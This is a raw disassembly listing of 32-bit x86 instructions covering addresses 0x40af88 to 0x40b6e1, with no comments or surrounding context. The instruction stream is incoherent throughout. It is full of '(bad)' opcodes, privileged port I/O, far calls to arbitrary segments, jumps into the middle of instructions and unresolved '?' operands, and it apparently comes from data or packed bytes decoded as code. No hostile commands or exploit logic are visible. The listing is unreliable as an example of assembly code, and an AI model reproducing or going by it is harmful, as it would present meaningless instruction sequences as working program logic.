  40af88:	add    edx,esp
  40af8a:	sub    bh,BYTE PTR [ebx]
  40af8c:	fimul  DWORD PTR [ecx-0x6c]
  40af8f:	xchg   esi,eax
  40af90:	push   cs
  40af91:	(bad)  
  40af92:	pushf  
  40af93:	aas    
  40af94:	sbb    eax,0xc2c88e5b
  40af99:	shl    DWORD PTR [edi-0x4472e675],1
  40af9f:	mov    ds:0xdfb14a31,al
  40afa4:	add    ah,BYTE PTR ds:0xf397d8fd
  40afaa:	xor    al,0x36
  40afac:	pop    es
  40afad:	push   edi
  40afae:	dec    edi
  40afaf:	gs arpl dx,bp
  40afb2:	mov    dh,BYTE PTR [ecx+eiz*8-0x79]
  40afb6:	jmp    0x40af71
  40afb8:	out    dx,al
  40afb9:	xchg   bl,cl
  40afbb:	push   0xffffffee
  40afbd:	or     DWORD PTR [edi],0xffffffe6
  40afc0:	xor    ch,ah
  40afc2:	cmp    esp,DWORD PTR [ecx+0x6e0d67b5]
  40afc8:	pop    ecx
  40afc9:	loop   0x40b033
  40afcb:	cmp    ah,ch
  40afcd:	xchg   ecx,eax
  40afce:	mov    BYTE PTR [edi],ah
  40afd0:	adc    al,BYTE PTR [esi+0x79]
  40afd3:	ins    BYTE PTR es:[edi],dx
  40afd4:	xchg   ebx,eax
  40afd5:	xor    eax,DWORD PTR [edi-0x5de60f37]
  40afdb:	fimul  DWORD PTR [eax+eax*8+0x1c]
  40afdf:	sub    al,0x8e
  40afe1:	scas   eax,DWORD PTR es:[edi]
  40afe2:	js     0x40b04f
  40afe4:	and    ecx,esp
  40afe6:	dec    ebx
  40afe7:	inc    eax
  40afe8:	dec    ebp
  40afe9:	pop    es
  40afea:	dec    esp
  40afeb:	jns    0x40b02a
  40afed:	xlat   BYTE PTR ds:[ebx]
  40afee:	cmp    DWORD PTR [ebx+0x5539e0cd],0x5743bea2
  40aff8:	push   cs
  40aff9:	push   cs
  40affa:	fs pop ss
  40affc:	adc    al,BYTE PTR [esi-0x688112ce]
  40b002:	xchg   ecx,eax
  40b003:	mov    ebp,0x6fe6ac15
  40b008:	scas   eax,DWORD PTR es:[edi]
  40b009:	(bad)  
  40b00a:	(bad)  
  40b00b:	jbe    0x40afc4
  40b00d:	fnsave [ecx+0x5b]
  40b010:	stos   DWORD PTR es:[edi],eax
  40b011:	aaa    
  40b012:	shl    dh,1
  40b014:	je     0x40afee
  40b016:	inc    ecx
  40b017:	cmp    BYTE PTR [eax-0x79],bh
  40b01a:	int    0x58
  40b01c:	mov    ebp,0x1a1f8b78
  40b021:	daa    
  40b022:	jae    0x40b003
  40b024:	xor    cl,BYTE PTR [ebx+0x4ca9f3fd]
  40b02a:	fsub   st(0),st
  40b02c:	dec    esp
  40b02d:	xchg   edx,eax
  40b02e:	fcom   QWORD PTR [edi+0x11]
  40b031:	fisttp DWORD PTR [edx]
  40b033:	sbb    eax,0x7b116c6e
  40b038:	xchg   bl,cl
  40b03a:	and    DWORD PTR [edi],esi
  40b03c:	inc    DWORD PTR [ecx]
  40b03e:	mov    edx,0x51f5509b
  40b043:	pop    DWORD PTR [ebx+0x71e47082]
  40b049:	in     eax,dx
  40b04a:	sub    dl,al
  40b04c:	or     eax,DWORD PTR [ecx-0x5e]
  40b04f:	mov    edx,0xe47daf26
  40b054:	mov    ds,ecx
  40b056:	or     DWORD PTR [esi+0x67],ebp
  40b059:	stc    
  40b05a:	or     ah,BYTE PTR [edx+0x6e]
  40b05d:	pop    ss
  40b05e:	iret   
  40b05f:	rcl    edi,1
  40b061:	inc    BYTE PTR [ecx]
  40b063:	lea    ebp,ds:[edi-0x25]
  40b067:	fwait
  40b068:	or     ebx,DWORD PTR [eax]
  40b06a:	fnstsw WORD PTR [ebx-0x3]
  40b06d:	xchg   ecx,eax
  40b06e:	rol    BYTE PTR [ebp-0x5f],cl
  40b071:	xchg   edx,eax
  40b072:	pop    eax
  40b073:	xor    DWORD PTR [ebp-0x2f],eax
  40b076:	and    DWORD PTR [edx],esi
  40b078:	mov    esp,0x437d6b10
  40b07d:	loop   0x40b08a
  40b07f:	mov    ah,0x68
  40b081:	jecxz  0x40b088
  40b083:	bound  esp,QWORD PTR [eax-0x6f]
  40b086:	sbb    dl,al
  40b088:	jo     0x40b04b
  40b08a:	stc    
  40b08b:	inc    eax
  40b08c:	sbb    bh,al
  40b08e:	imul   BYTE PTR [edx]
  40b090:	or     dh,cl
  40b092:	and    DWORD PTR [ebx+0xb],edx
  40b095:	out    0x36,al
  40b097:	pop    edx
  40b098:	cli    
  40b099:	in     eax,0xee
  40b09b:	inc    esi
  40b09c:	jnp    0x40b02b
  40b09e:	jo     0x40b024
  40b0a0:	shl    DWORD PTR [edx-0x76],0xce
  40b0a4:	iret   
  40b0a5:	push   edx
  40b0a6:	lock cmp BYTE PTR [ecx+0x67],ch
  40b0aa:	sbb    al,0x87
  40b0ac:	hlt    
  40b0ad:	call   0xeb01:0x73a4c515
  40b0b4:	pop    edi
  40b0b5:	lock ins BYTE PTR es:[edi],dx
  40b0b7:	out    dx,al
  40b0b8:	dec    ebp
  40b0b9:	mov    bl,0xeb
  40b0bb:	cdq    
  40b0bc:	pop    edx
  40b0bd:	dec    ecx
  40b0be:	cli    
  40b0bf:	arpl   WORD PTR [ecx],di
  40b0c1:	jo     0x40b10c
  40b0c3:	popa   
  40b0c4:	mov    al,ds:0xea0fc20a
  40b0c9:	xor    eax,0x8a6d226
  40b0ce:	inc    edx
  40b0cf:	and    al,0x4b
  40b0d1:	add    DWORD PTR [edx-0x72],esi
  40b0d4:	stos   DWORD PTR es:[edi],eax
  40b0d5:	mov    DWORD PTR [ecx+0x1c427490],edi
  40b0db:	sub    eax,0x8f4b4cdc
  40b0e0:	(bad)  
  40b0e1:	clc    
  40b0e2:	leave  
  40b0e3:	popf   
  40b0e4:	icebp  
  40b0e5:	ds enter 0x3b20,0x77
  40b0ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0eb:	xor    BYTE PTR [ebp+0x3ed08653],ch
  40b0f1:	(bad)  
  40b0f2:	push   cs
  40b0f3:	cmp    eax,0x1019216
  40b0f8:	imul   ebp,DWORD PTR [ebx],0xfffffffd
  40b0fb:	add    BYTE PTR [edi],dh
  40b0fd:	jo     0x40b16c
  40b0ff:	jo     0x40b103
  40b101:	lods   eax,DWORD PTR ds:[esi]
  40b102:	push   ecx
  40b103:	jge    0x40b0c2
  40b105:	in     al,dx
  40b106:	fwait
  40b107:	xchg   edi,eax
  40b108:	call   0x2407:0x3f24797f
  40b10f:	stos   DWORD PTR es:[edi],eax
  40b110:	adc    BYTE PTR [edi+0x1ea82a37],0x5c
  40b117:	jle    0x40b124
  40b119:	jmp    DWORD PTR [ebp-0x5e]
  40b11c:	in     al,0x88
  40b11e:	stc    
  40b11f:	xor    dh,BYTE PTR [edx+0x71]
  40b122:	test   DWORD PTR [edi+0x18a8cac8],ebp
  40b128:	fdivr  DWORD PTR [ecx]
  40b12a:	add    BYTE PTR [eax-0x3e],bl
  40b12d:	xchg   ebp,eax
  40b12e:	enter  0x1c8b,0x5d
  40b132:	mov    al,0x2f
  40b134:	fcom   DWORD PTR [ebp+0x1a]
  40b137:	xchg   DWORD PTR [ebx],ebx
  40b139:	mov    bl,0x65
  40b13b:	in     al,0x1b
  40b13d:	out    dx,al
  40b13e:	sbb    bh,cl
  40b140:	add    esp,DWORD PTR ds:0x959d972
  40b146:	and    BYTE PTR [eax+edx*8],dl
  40b149:	dec    esp
  40b14a:	mov    cl,0x59
  40b14c:	push   edi
  40b14d:	shl    ecx,1
  40b14f:	add    al,0x36
  40b151:	pop    eax
  40b152:	sub    BYTE PTR [edx+0x25],0xe0
  40b156:	jbe    0x40b1a9
  40b158:	and    BYTE PTR [edi+0x18],dl
  40b15b:	xchg   esp,eax
  40b15c:	jge    0x40b1c7
  40b15e:	cmp    ebx,DWORD PTR [ebx+0x163de1ea]
  40b164:	or     cl,dh
  40b166:	mov    bh,0x30
  40b168:	std    
  40b169:	test   eax,0x9baf6783
  40b16e:	cmp    DWORD PTR [ebp+0x24],ebx
  40b171:	loope  0x40b126
  40b173:	mov    dh,0x7a
  40b175:	loope  0x40b11f
  40b177:	mov    ah,0xe7
  40b179:	fwait
  40b17a:	mov    ch,0x4d
  40b17c:	pop    ecx
  40b17d:	push   ecx
  40b17e:	in     eax,dx
  40b17f:	or     al,0x38
  40b181:	jmp    0xea6162af
  40b186:	pop    ebx
  40b187:	je     0x40b19b
  40b189:	scas   eax,DWORD PTR es:[edi]
  40b18a:	outs   dx,BYTE PTR ds:[si]
  40b18c:	inc    edx
  40b18d:	loope  0x40b160
  40b18f:	adc    esi,eax
  40b191:	sub    dl,ah
  40b193:	test   esp,edi
  40b195:	mov    dl,0xb4
  40b197:	pop    esi
  40b198:	int    0xc2
  40b19a:	cmp    al,0xac
  40b19c:	idiv   bh
  40b19e:	data16 fs sub dl,ch
  40b1a2:	gs call 0x44fd:0x51b326d2
  40b1aa:	stc    
  40b1ab:	push   es
  40b1ac:	jmp    0x43f3:0x35c82794
  40b1b3:	ins    BYTE PTR es:[edi],dx
  40b1b4:	loopne 0x40b1bb
  40b1b6:	cmp    BYTE PTR [ecx+0x2e],ah
  40b1b9:	sub    BYTE PTR [edi-0x4b],0x7
  40b1bd:	addr16 pushf 
  40b1bf:	inc    edi
  40b1c0:	(bad)  
  40b1c1:	pop    ds
  40b1c2:	push   esp
  40b1c3:	ja     0x40b1ee
  40b1c5:	mov    bl,0x1a
  40b1c7:	add    bl,BYTE PTR [ebx]
  40b1c9:	push   0x520fccba
  40b1ce:	in     eax,0xb
  40b1d0:	jecxz  0x40b1ea
  40b1d2:	fisttp DWORD PTR [eax+0x23]
  40b1d5:	cwde   
  40b1d6:	pop    ecx
  40b1d7:	push   ss
  40b1d8:	add    esi,esi
  40b1da:	scas   eax,DWORD PTR es:[edi]
  40b1db:	and    ah,BYTE PTR [ecx+edx*2-0x40811c61]
  40b1e2:	shl    bl,cl
  40b1e4:	fs call 0xb6:0x96b52768
  40b1ec:	sbb    al,0x66
  40b1ee:	daa    
  40b1ef:	aaa    
  40b1f0:	xchg   esp,eax
  40b1f1:	movntps XMMWORD PTR [eax-0x44787fef],xmm2
  40b1f8:	mov    edx,0x22c38252
  40b1fd:	shl    BYTE PTR [ecx],cl
  40b1ff:	mov    dh,0xb2
  40b201:	scas   al,BYTE PTR es:[edi]
  40b202:	mov    cl,BYTE PTR [eax-0x7f]
  40b205:	adc    al,0xc5
  40b207:	icebp  
  40b208:	mov    DWORD PTR [eax-0x49],ebp
  40b20b:	push   esi
  40b20c:	int    0x8b
  40b20e:	fs jmp 0x11591ca
  40b214:	xor    eax,0xf86efbf7
  40b219:	shl    DWORD PTR [edx+0x2a],cl
  40b21c:	and    dh,BYTE PTR ds:0x13d51523
  40b222:	cld    
  40b223:	lahf   
  40b224:	push   ecx
  40b225:	add    al,0x80
  40b227:	pushf  
  40b228:	test   eax,0xaeb546a5
  40b22d:	adc    eax,0x3665f2a4
  40b232:	pop    esi
  40b233:	push   cs
  40b234:	inc    eax
  40b235:	test   eax,0x1204d445
  40b23a:	dec    ebx
  40b23b:	xor    dl,al
  40b23d:	jl     0x40b1d7
  40b23f:	pop    es
  40b240:	out    0xb1,eax
  40b242:	bound  edi,QWORD PTR [ecx+edx*1+0x30]
  40b246:	mov    al,ds:0x9c68e8d1
  40b24b:	fstp   TBYTE PTR [edx+0xaa224ef]
  40b251:	dec    edx
  40b252:	push   esp
  40b253:	dec    ebx
  40b254:	inc    ebx
  40b255:	stc    
  40b256:	out    dx,eax
  40b257:	scas   al,BYTE PTR es:[edi]
  40b258:	pop    ebx
  40b259:	out    0x49,eax
  40b25b:	imul   ebx,ebx,0xffffff9b
  40b25e:	call   0x9ca1507c
  40b263:	into   
  40b264:	xor    al,BYTE PTR [eax+0x44]
  40b267:	sub    BYTE PTR [edi-0x4c],ch
  40b26a:	daa    
  40b26b:	cld    
  40b26c:	in     al,0x53
  40b26e:	pop    ds
  40b26f:	jl     0x40b282
  40b271:	and    DWORD PTR [ebx-0x6d],esi
  40b274:	popa   
  40b275:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b277:	inc    ebp
  40b278:	sbb    eax,0x65e18e36
  40b27d:	rol    BYTE PTR [edx+0x1c4b28ea],1
  40b283:	lea    esi,[edx+0x22d77752]
  40b289:	add    BYTE PTR ss:[edx-0xa6dbf12],dh
  40b290:	pop    edx
  40b291:	sbb    dl,ch
  40b293:	jle    0x40b253
  40b295:	dec    edx
  40b296:	and    DWORD PTR [ebp+0x620c5d1c],esi
  40b29c:	pop    eax
  40b29d:	addr16 mov esp,0x4baa6050
  40b2a3:	adc    al,0xe1
  40b2a5:	mov    esi,gs
  40b2a7:	rcr    BYTE PTR [esi],1
  40b2a9:	mov    ch,0x7e
  40b2ab:	fs ja  0x40b24e
  40b2ae:	jle    0x40b2f7
  40b2b0:	aaa    
  40b2b1:	cli    
  40b2b2:	add    edx,DWORD PTR [eax+0x7d]
  40b2b5:	scas   al,BYTE PTR es:[edi]
  40b2b6:	fcomp  QWORD PTR [edx-0x7]
  40b2b9:	mov    ebp,0xa78e356d
  40b2be:	jnp    0x40b31e
  40b2c0:	pop    esp
  40b2c1:	shr    BYTE PTR [eax-0x74],cl
  40b2c4:	aaa    
  40b2c5:	sbb    DWORD PTR [ebp+0x2c67ef92],0xffffffbf
  40b2cc:	rcr    DWORD PTR [ebp+0x7e268bba],0x87
  40b2d3:	or     al,0xcd
  40b2d5:	nop
  40b2d6:	inc    eax
  40b2d7:	ss mov edx,0x9ee617b7
  40b2dd:	loop   0x40b317
  40b2df:	sbb    eax,0xdd969865
  40b2e4:	icebp  
  40b2e5:	jbe    0x40b29c
  40b2e7:	mov    esp,0x6aaa831c
  40b2ec:	mov    al,ds:0xf9f752bc
  40b2f1:	fisub  WORD PTR ds:0x54e2a796
  40b2f7:	push   0x1cbec54e
  40b2fc:	sbb    esi,ebp
  40b2fe:	pop    esi
  40b2ff:	pop    esi
  40b300:	add    BYTE PTR [edi+0x2355d267],cl
  40b306:	test   eax,0x5b896de4
  40b30b:	scas   eax,DWORD PTR es:[edi]
  40b30c:	push   esp
  40b30d:	cmp    edi,edx
  40b30f:	xor    DWORD PTR [eax-0x8],eax
  40b312:	test   eax,0xf163d290
  40b317:	dec    ecx
  40b318:	pop    es
  40b319:	mov    BYTE PTR [esi],bh
  40b31b:	mov    ds:0x26a60d25,eax
  40b320:	pusha  
  40b321:	add    eax,eax
  40b323:	lods   al,BYTE PTR ds:[esi]
  40b324:	(bad)  
  40b325:	mov    bh,0x35
  40b327:	mov    esi,0x841f8d05
  40b32c:	push   ss
  40b32d:	jbe    0x40b384
  40b32f:	cmp    ch,BYTE PTR [esi+eiz*4]
  40b332:	and    esi,DWORD PTR [edx]
  40b334:	inc    ecx
  40b335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b336:	sbb    esp,esp
  40b338:	adc    eax,0xba0cbc83
  40b33d:	sub    eax,0xa4a70353
  40b342:	sbb    al,0x96
  40b344:	cmc    
  40b345:	popf   
  40b346:	xchg   ebp,eax
  40b347:	dec    edx
  40b348:	popa   
  40b349:	aas    
  40b34a:	or     ah,BYTE PTR es:[edi]
  40b34d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b34e:	loope  0x40b314
  40b350:	fwait
  40b351:	cmp    al,0xe2
  40b353:	adc    DWORD PTR [ebx],ebx
  40b355:	push   cs
  40b356:	xchg   ebp,eax
  40b357:	jo     0x40b2e1
  40b359:	sbb    al,0x68
  40b35b:	and    ecx,DWORD PTR [eax]
  40b35d:	int3   
  40b35e:	cmp    eax,0x7e8fd628
  40b363:	cwde   
  40b364:	pushf  
  40b365:	push   es
  40b366:	mov    esi,0xdab407f9
  40b36b:	daa    
  40b36c:	jns    0x40b3e4
  40b36e:	mov    eax,0x630e158b
  40b373:	jb     0x40b37b
  40b375:	push   edi
  40b376:	aas    
  40b377:	inc    esi
  40b378:	(bad)  
  40b379:	retf   0xaa23
  40b37c:	sub    eax,0x9eb2e5bf
  40b381:	stos   BYTE PTR es:[edi],al
  40b382:	dec    edi
  40b383:	mov    BYTE PTR [ecx-0x2f],bl
  40b386:	xchg   edi,eax
  40b387:	cmp    ebx,esi
  40b389:	into   
  40b38a:	bound  esp,QWORD PTR [edx+0x210cb09c]
  40b390:	shl    ebp,1
  40b392:	jae    0x40b3c0
  40b394:	sub    al,0x99
  40b396:	mov    ah,0xcd
  40b398:	int3   
  40b399:	lds    edi,FWORD PTR [esi-0x6fc266a1]
  40b39f:	pop    es
  40b3a0:	dec    ebx
  40b3a1:	or     al,0x14
  40b3a3:	cmp    eax,0x50f2dd37
  40b3a8:	or     BYTE PTR [esi],0x97
  40b3ab:	mov    eax,0x9bed5c31
  40b3b0:	jge    0x40b374
  40b3b2:	mov    ebp,0xa29719c8
  40b3b7:	ffree  st(3)
  40b3b9:	jmp    0x92a2f310
  40b3be:	jnp    0x40b421
  40b3c0:	(bad)  [ebp-0x50]
  40b3c3:	rcr    eax,0xc0
  40b3c6:	jno    0x40b37a
  40b3c8:	fadd   QWORD PTR [ebp-0x69]
  40b3cb:	loope  0x40b359
  40b3cd:	jbe    0x40b3cd
  40b3cf:	jae    0x40b3fb
  40b3d1:	jp     0x40b3a3
  40b3d3:	cmc    
  40b3d4:	jl     0x40b396
  40b3d6:	adc    dh,BYTE PTR [eax+0x71]
  40b3d9:	out    0x1,eax
  40b3db:	dec    esp
  40b3dc:	xchg   ebx,eax
  40b3dd:	and    eax,0xbc28c1e5
  40b3e2:	scas   al,BYTE PTR es:[edi]
  40b3e3:	pop    ecx
  40b3e4:	mov    eax,0x42c631c7
  40b3e9:	mov    esi,DWORD PTR [edx+0x67]
  40b3ec:	xor    ebp,edx
  40b3ee:	and    ch,BYTE PTR [edi]
  40b3f0:	pushf  
  40b3f1:	pop    ebx
  40b3f2:	ret    
  40b3f3:	and    DWORD PTR [ecx],ecx
  40b3f5:	mov    al,ds:0xbfd11aa7
  40b3fa:	lods   al,BYTE PTR ds:[esi]
  40b3fb:	cmp    al,ah
  40b3fd:	in     al,dx
  40b3fe:	xchg   esi,eax
  40b3ff:	jnp    0x40b461
  40b401:	jo     0x40b42e
  40b403:	mov    edx,0x724229bc
  40b408:	stos   DWORD PTR es:[edi],eax
  40b409:	shl    BYTE PTR ds:0xfb77fd94,1
  40b40f:	cwde   
  40b410:	sahf   
  40b411:	adc    DWORD PTR ds:0xbcc835a6,0x74
  40b418:	inc    esi
  40b419:	pop    ecx
  40b41a:	sahf   
  40b41b:	fs sub al,ch
  40b41e:	rol    DWORD PTR [ebx+0x3f1c3ec4],cl
  40b424:	mov    edx,DWORD PTR [ebp+0x12c82f3c]
  40b42a:	add    ch,ch
  40b42c:	scas   al,BYTE PTR es:[edi]
  40b42d:	stos   DWORD PTR es:[edi],eax
  40b42e:	jae    0x40b3f6
  40b430:	xchg   edi,eax
  40b431:	mov    bh,0x63
  40b433:	xchg   DWORD PTR [edx-0x39],ebx
  40b436:	dec    eax
  40b437:	out    dx,al
  40b438:	stos   BYTE PTR es:[edi],al
  40b439:	jae    0x40b3f8
  40b43b:	push   cs
  40b43c:	and    ebp,DWORD PTR [ebx-0x80]
  40b43f:	pop    eax
  40b440:	mov    eax,DWORD PTR [ecx-0x5b68dd9e]
  40b446:	bnd jne 0x40b44b
  40b449:	sub    al,0x79
  40b44b:	push   0xffffffb5
  40b44d:	adc    DWORD PTR [ecx-0x3414bcab],0x280db741
  40b457:	jge    0x40b475
  40b459:	push   edx
  40b45a:	pop    edi
  40b45b:	leave  
  40b45c:	das    
  40b45d:	or     BYTE PTR [edx-0x7592aa79],bl
  40b463:	inc    eax
  40b464:	das    
  40b465:	inc    ecx
  40b466:	outs   dx,BYTE PTR ds:[esi]
  40b467:	sahf   
  40b468:	xor    DWORD PTR fs:[ecx-0x45bf556c],0xffffff99
  40b470:	(bad)  
  40b471:	stc    
  40b472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b473:	add    al,0xbb
  40b475:	int    0x31
  40b477:	mov    ds:0xc3bc6a2,al
  40b47c:	jl     0x40b4b6
  40b47e:	aad    0x67
  40b480:	or     BYTE PTR [ecx],dh
  40b482:	adc    eax,0xc012ffe3
  40b487:	dec    esp
  40b488:	ucomiss xmm1,xmm0
  40b48b:	inc    ebx
  40b48c:	shl    DWORD PTR [ebp+0x7ffd0171],0x22
  40b493:	sbb    DWORD PTR [ebp-0x22],0xbd2d661
  40b49a:	push   0xa8aed201
  40b49f:	mov    DWORD PTR [edx-0x2],eax
  40b4a2:	(bad)  
  40b4a3:	not    DWORD PTR [ebp+0x38]
  40b4a6:	jbe    0x40b4e6
  40b4a8:	pusha  
  40b4a9:	lods   eax,DWORD PTR ds:[esi]
  40b4aa:	jl     0x40b510
  40b4ac:	dec    ebx
  40b4ad:	add    al,0x51
  40b4af:	push   esi
  40b4b0:	mov    esi,0xb4309f24
  40b4b5:	jle    0x40b481
  40b4b7:	mov    ch,0x74
  40b4b9:	aad    0xb4
  40b4bb:	dec    ebp
  40b4bc:	fsub   DWORD PTR [esi]
  40b4be:	dec    esp
  40b4bf:	lods   eax,DWORD PTR ds:[esi]
  40b4c0:	push   esi
  40b4c1:	hlt    
  40b4c2:	mov    al,ds:0x76cc40d8
  40b4c7:	add    DWORD PTR [eax-0x51bbe8c2],eax
  40b4cd:	add    al,0x9
  40b4cf:	nop
  40b4d0:	mov    ah,0xb7
  40b4d2:	cmp    eax,0xfccdd8cb
  40b4d7:	jo     0x40b51f
  40b4d9:	push   ds
  40b4da:	cmp    eax,0x591b9766
  40b4df:	mov    eax,0xc87169d9
  40b4e4:	mov    ecx,edi
  40b4e6:	sar    DWORD PTR [edx-0x10],1
  40b4e9:	sub    DWORD PTR ds:0x86bf100d,esi
  40b4ef:	std    
  40b4f0:	lods   eax,DWORD PTR ds:[esi]
  40b4f1:	adc    al,0xf5
  40b4f3:	add    al,0xb9
  40b4f5:	sub    al,0xe1
  40b4f7:	jle    0x40b4ea
  40b4f9:	cmp    cl,BYTE PTR [ecx]
  40b4fb:	xor    eax,0x768b772e
  40b500:	in     eax,0xcb
  40b502:	rcr    DWORD PTR [edi],0xce
  40b505:	push   0x4b
  40b507:	jb     0x40b4ee
  40b509:	dec    edi
  40b50a:	(bad)  
  40b50b:	xor    bl,BYTE PTR [edi-0x65]
  40b50e:	or     al,0x7b
  40b510:	xor    al,0xc9
  40b512:	test   ch,0x63
  40b515:	nop
  40b516:	hlt    
  40b517:	clc    
  40b518:	mov    ds:0xc8ea4e70,eax
  40b51d:	push   ecx
  40b51e:	jae    0x40b4de
  40b520:	jecxz  0x40b54b
  40b522:	stos   DWORD PTR es:[edi],eax
  40b523:	or     eax,0x10376a41
  40b528:	sbb    al,0x18
  40b52a:	push   ds
  40b52b:	mov    WORD PTR [eax+eiz*4],?
  40b52e:	ret    0xdd50
  40b531:	sbb    al,0xdd
  40b533:	mov    edx,0x6be8d68e
  40b538:	xor    ebp,eax
  40b53a:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40b53c:	xchg   ecx,eax
  40b53d:	push   ss
  40b53e:	jmp    0xf3fbdb68
  40b543:	xchg   ebx,eax
  40b544:	loop   0x40b598
  40b546:	or     al,0xce
  40b548:	aad    0x2f
  40b54a:	adc    edi,DWORD PTR [edi]
  40b54c:	adc    DWORD PTR [ecx],edx
  40b54e:	popf   
  40b54f:	addr16 inc ebp
  40b551:	dec    eax
  40b552:	cmp    DWORD PTR [edx],ecx
  40b554:	push   ebx
  40b555:	lea    ebx,ds:0x3aa0c68c
  40b55b:	push   ebp
  40b55c:	loope  0x40b4ed
  40b55e:	icebp  
  40b55f:	hlt    
  40b560:	mov    ebp,0x27d925c0
  40b565:	pop    esi
  40b566:	mov    ecx,0xc41f8a6f
  40b56b:	pop    edi
  40b56c:	popf   
  40b56d:	inc    ebx
  40b56e:	sub    eax,0xcfb87005
  40b573:	xor    edi,DWORD PTR [edi-0x77]
  40b576:	mov    ebx,0x3760570d
  40b57b:	sub    al,0x3
  40b57d:	div    DWORD PTR [edi-0x416a8d43]
  40b583:	pushf  
  40b584:	ins    DWORD PTR es:[edi],dx
  40b585:	or     al,0xb6
  40b587:	gs jbe 0x40b56f
  40b58a:	int    0xa
  40b58c:	push   ds
  40b58d:	(bad)  
  40b58e:	in     al,dx
  40b58f:	sub    ch,BYTE PTR ds:0x39b0aa4c
  40b595:	ret    
  40b596:	push   0x24
  40b598:	cmc    
  40b599:	dec    ecx
  40b59a:	pop    es
  40b59b:	cld    
  40b59c:	mov    dh,0x8a
  40b59e:	jno    0x40b59c
  40b5a0:	adc    ecx,edi
  40b5a2:	mov    ?,WORD PTR [esi-0x8c14fe4]
  40b5a8:	pop    edx
  40b5a9:	test   BYTE PTR [eax-0x28],ah
  40b5ac:	cmp    al,0x67
  40b5ae:	out    0x38,al
  40b5b0:	pop    esp
  40b5b1:	jle    0x40b5ec
  40b5b3:	mov    ah,0xeb
  40b5b5:	loopne 0x40b605
  40b5b7:	fsub   DWORD PTR [ebx+edx*2+0xc]
  40b5bb:	sti    
  40b5bc:	adc    bh,BYTE PTR [ebx]
  40b5be:	(bad)  
  40b5bf:	fcom   QWORD PTR [ecx+0x3]
  40b5c2:	out    dx,al
  40b5c3:	stos   BYTE PTR es:[edi],al
  40b5c4:	aas    
  40b5c5:	test   al,0xec
  40b5c7:	mov    bl,0x6
  40b5c9:	dec    esi
  40b5ca:	xor    ebp,ebx
  40b5cc:	dec    esp
  40b5cd:	push   0x77
  40b5cf:	mov    eax,ds:0x3c57e0fc
  40b5d4:	mov    edx,0x534d4e6c
  40b5d9:	rcr    DWORD PTR [edi+0x56],cl
  40b5dc:	rcr    BYTE PTR [ebx-0x2e],1
  40b5df:	(bad)  
  40b5e0:	out    0xf3,eax
  40b5e2:	lea    eax,[edi]
  40b5e4:	jmp    0x21bf:0xa8f7dfee
  40b5eb:	push   cs
  40b5ec:	lods   al,BYTE PTR ds:[esi]
  40b5ed:	add    DWORD PTR [edi+eiz*4+0x4f],ebp
  40b5f1:	or     eax,0x8a057179
  40b5f6:	jp     0x40b5c6
  40b5f8:	in     eax,0x59
  40b5fa:	jmp    0x82eed38b
  40b5ff:	sbb    bh,dh
  40b601:	(bad)  
  40b602:	jg     0x40b5f1
  40b604:	push   edx
  40b605:	in     eax,0x12
  40b607:	in     eax,dx
  40b608:	adc    eax,0xf8ad1102
  40b60d:	push   eax
  40b60e:	jge    0x40b654
  40b610:	fmulp  st(4),st
  40b612:	repnz aaa 
  40b614:	xchg   esi,eax
  40b615:	mov    edi,0xfe8b3ed7
  40b61a:	sub    BYTE PTR [ecx-0x21],bh
  40b61d:	sbb    al,ch
  40b61f:	fbstp  TBYTE PTR [edi+0x639e45ea]
  40b625:	cmp    al,0xca
  40b627:	in     eax,0x7a
  40b629:	push   ds
  40b62a:	inc    eax
  40b62b:	in     al,0x37
  40b62d:	inc    esi
  40b62e:	mul    BYTE PTR [bp+si]
  40b631:	retf   0x7467
  40b634:	xlat   BYTE PTR ds:[ebx]
  40b635:	aam    0x1a
  40b637:	shr    DWORD PTR [edx-0x44],cl
  40b63a:	call   0x7e62:0xac4b1bed
  40b641:	test   al,0x30
  40b643:	inc    esp
  40b644:	loope  0x40b68e
  40b646:	in     eax,0x61
  40b648:	xchg   ebx,eax
  40b649:	jnp    0x40b60d
  40b64b:	dec    edi
  40b64c:	aam    0x65
  40b64e:	sub    al,0x53
  40b650:	(bad)  
  40b651:	xor    edi,ebx
  40b653:	sub    al,0x6c
  40b655:	lea    ebx,[edi+0x441e1eaf]
  40b65b:	add    al,0xa0
  40b65d:	addr16 leave 
  40b65f:	mov    ds:0x3fd2ebfe,al
  40b664:	push   ebx
  40b665:	(bad)  
  40b666:	mov    al,ds:0x632862cc
  40b66b:	inc    eax
  40b66c:	xchg   edx,eax
  40b66d:	or     eax,0xa0e938dc
  40b672:	cmp    edx,DWORD PTR [ebp-0x1a]
  40b675:	imul   edx,DWORD PTR [ecx+0x2],0xffffffd5
  40b679:	add    al,0x80
  40b67b:	(bad)  
  40b67c:	xor    DWORD PTR [eax+0x7a57802c],ecx
  40b682:	inc    eax
  40b683:	fstp   TBYTE PTR [edi+edx*4+0x24]
  40b687:	int3   
  40b688:	rcr    DWORD PTR [ebx+0x599bae75],0x15
  40b68f:	or     al,0x49
  40b691:	out    dx,eax
  40b692:	shl    BYTE PTR es:[edi+0x449a27ba],1
  40b699:	cli    
  40b69a:	mov    esp,0xd88b02d2
  40b69f:	push   ebp
  40b6a0:	jnp    0x40b625
  40b6a2:	repnz dec ebx
  40b6a4:	rcr    BYTE PTR [ebx],1
  40b6a6:	xchg   edi,eax
  40b6a7:	das    
  40b6a8:	ja     0x40b655
  40b6aa:	jbe    0x40b6ba
  40b6ac:	add    al,0xb2
  40b6ae:	xor    DWORD PTR [ebp*2+0x23badef8],ebx
  40b6b5:	lods   al,BYTE PTR ds:[esi]
  40b6b6:	test   al,0xbd
  40b6b8:	int    0x8c
  40b6ba:	mov    eax,0xf579e6d9
  40b6bf:	call   0x25d1:0xde98e057
  40b6c6:	daa    
  40b6c7:	mov    DWORD PTR [edi+0x35d03680],edx
  40b6cd:	jns    0x40b702
  40b6cf:	dec    esi
  40b6d0:	sbb    ebp,ecx
  40b6d2:	(bad)
  40b6d5:	inc    ebx
  40b6d6:	mov    eax,ds:0x9c39437d
  40b6db:	shl    BYTE PTR [ebp-0x2],1
  40b6de:	jno    0x40b743
  40b6e0:	(bad)  
  40b6e1:	or     al,0x3b
